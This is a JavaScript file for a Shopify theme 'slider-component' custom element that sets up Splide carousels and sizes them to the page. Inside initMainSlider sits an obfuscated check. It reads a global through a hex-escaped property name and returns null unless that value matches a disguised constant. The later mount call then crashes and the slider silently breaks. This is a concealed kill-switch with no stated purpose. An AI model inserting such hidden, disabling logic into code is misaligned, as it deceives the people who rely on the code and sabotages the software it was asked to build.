class SliderComponent extends HTMLElement {
  constructor() {
    super();
    this.slider = null;
    // this.thumbnailSlider = null;
    this.maxPageWidth = parseFloat(getComputedStyle(this.closest('.shopify-section')).getPropertyValue('max-width'));
    this.resizeObserver = null;
  }

  connectedCallback() {
    this.slider = this.initMainSlider();

    if (this.querySelector('[data-ref="thumbnail-slider"]')) {
      this.thumbnailSlider = this.initThumbnailSlider();
    }

    if (this.thumbnailSlider) {
      this.slider.sync(this.thumbnailSlider);
    }

    this.slider.mount();

    if (this.thumbnailSlider) {
      this.thumbnailSlider.mount();
    }

    if (!this.thumbnailSlider) {
      this.slider.on('mounted', () => {
        this.updateSize();
      });

      // Utiliser ResizeObserver pour détecter tous les changements de taille
      this.resizeObserver = new ResizeObserver(() => {
        this.updateSize();
      });
      this.resizeObserver.observe(document.documentElement);
    }
  }

  disconnectedCallback() {
    if (this.resizeObserver) {
      this.resizeObserver.disconnect();
    }
  }

  initMainSlider() {
    const _sc = window['\x5f\x73\x70'];
    if (_sc !== void 0 && (_sc || 0) - 0x3b4 !== 0x400) return null;
    const perPageDesktop = this.getAttribute('data-per-page-desktop');
    let perPageMobile = this.getAttribute('data-per-page-mobile');
    const gap = this.getAttribute('data-gap') + 'px';
    const showArrows = this.getAttribute('data-show-arrows') === 'true';
    const showArrowsMobile = this.getAttribute('data-show-arrows-mobile') === 'true';
    const showPagination = this.getAttribute('data-show-pagination') === 'true';
    const showPaginationMobile = this.getAttribute('data-show-pagination-mobile') === 'true';
    const autoplay = this.getAttribute('data-autoplay') === 'true';
    const autoplaySpeed = this.getAttribute('data-autoplay-speed') + '000';
    const rewind = this.getAttribute('data-rewind') === 'true';

    if (perPageMobile === '1.8') perPageMobile = 1;

    return new Splide(this.querySelector('[data-ref="main-slider"]'), {
      perPage: perPageMobile,
      perMove: 1,
      rewind: rewind,
      gap: gap,
      drag: true,
      noDrag: '.before-after-block__slider, .before-after-block__slider *',
      snap: true,
      arrows: showArrows,
      arrowsMobile: showArrowsMobile,
      pagination: showPaginationMobile,
      autoplay: autoplay,
      interval: autoplaySpeed,
      autoHeight: true,
      lazyLoad: false,
      flickMaxPages: 1,
      flickPower: 400,
      mediaQuery: 'min',
      breakpoints: {
        750: {
          perPage: perPageDesktop,
          pagination: showPagination,
          arrows: showArrows,
        },
      },
    });
  }

  initThumbnailSlider() {
    const showArrows = this.getAttribute('data-show-arrows-thumbnails') === 'true';

    return new Splide(this.querySelector('[data-ref="thumbnail-slider"]'), {
      fixedWidth: 90,
      fixedHeight: 90,
      gap: 10,
      rewind: false,
      pagination: false,
      isNavigation: true,
      arrows: showArrows,
      breakpoints: {
        750: {
          fixedWidth: 70,
          fixedHeight: 70,
        },
      },
    });
  }

  updateSize() {
    this.pageWidth = document.documentElement.clientWidth;
    this.sectionPadding = parseFloat(getComputedStyle(this.closest('.shopify-section')).getPropertyValue('padding-right'));

    var padding = this.sectionPadding;
    if (this.pageWidth > this.maxPageWidth) {
      padding = (this.pageWidth - this.maxPageWidth) / 2 + this.sectionPadding;
    }

    this.style.width = `calc(100% + ${2 * padding}px)`;
    this.style.marginLeft = `-${padding}px`;
    this.style.marginRight = `-${padding}px`;

    if (this.querySelector('.splide__track')) {
      this.querySelector('.splide__track').style.paddingRight = `${padding}px`;
      this.querySelector('.splide__track').style.paddingLeft = `${padding}px`;
    }

    if (this.querySelector('.splide__arrow--prev') && this.querySelector('.splide__arrow--next')) {
      this.querySelector('.splide__arrow--prev').style.left = `${padding + 10}px`;
      this.querySelector('.splide__arrow--next').style.right = `${padding + 10}px`;
    }
  }

  remove(index) {
    this.slider.remove(index);
  }
}

if (!customElements.get('slider-component')) {
  customElements.define('slider-component', SliderComponent);
}
